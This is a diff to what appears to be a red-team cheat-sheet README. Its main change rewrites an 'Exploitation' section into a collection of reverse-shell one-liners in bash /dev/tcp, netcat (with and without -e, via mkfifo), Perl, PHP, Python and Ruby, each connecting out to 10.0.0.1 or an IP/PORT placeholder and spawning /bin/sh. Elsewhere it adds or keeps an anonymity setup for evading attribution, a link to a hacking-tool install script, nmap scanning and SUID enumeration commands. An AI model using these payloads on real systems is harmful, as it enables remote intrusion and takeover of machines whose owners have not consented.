@@ -54,7 +54,7 @@ curl -s wtfismyip.com/json | jq
 curl ifconfig.me
 ```
 
-## Stay anonymous
+### Stay anonymous
 \- ⚠️ Anonymity is not just the tool — it’s behavior. One slip (like logging into your mail or reusing usernames) can burn the whole setup.
 
 ***Multi-Layered Anonymization Solution(VPN + Tor + Sandboxing)***
@@ -89,6 +89,7 @@ curl ifconfig.me
 
 <br>
 
+### Automation
 ***Automatically install essential hacking & dev tools on a fresh linux install***
 
 \- [Install tools script](https://github.com/80h3m14n/red-team-tools/blob/main/automation/install-tools.sh)
@@ -144,15 +145,40 @@ nmap -p- -T4 -A -v target.com
 
 ## 💥 Exploitation
 
-```bash
-# Python reverse shell
-python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 
-# Netcat reverse shell
+**Bash**
+```bash Reverse Shell One-Liners
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+**Netcat reverse shell**
+```Netcat Reverse Shell One-Liners
 nc -e /bin/sh IP PORT
+```
 
-# PHP reverse shell
+Netcat without -e Reverse Shell One-Liners
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
+```
+
+Perl Reverse Shell One-Liners
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+PHP Reverse Shell One-Liners
+```
 php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Python Reverse Shell One-Liners
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Ruby Reverse Shell One-Liners
+```
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
 ---
@@ -172,6 +198,9 @@ netstat -tulpn
 # SUID Binaries
 find / -perm -4000 -type f 2>/dev/null
 ```
+
+
+
 
 ---
 
